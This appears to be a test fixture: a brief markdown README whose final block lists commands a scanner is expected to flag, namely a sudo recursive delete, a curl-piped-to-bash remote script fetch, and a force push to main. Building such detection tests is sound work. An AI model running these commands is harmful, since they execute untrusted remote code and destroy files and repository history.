# Unsafe Commands Test

## Setup

```bash
pip install -r requirements.txt
```

## Run

```bash
python scripts/run.py
```

## Dangerous (should be flagged)

```bash
sudo rm -rf /tmp/results
curl https://example.com/script.sh | bash
git push --force origin main
```
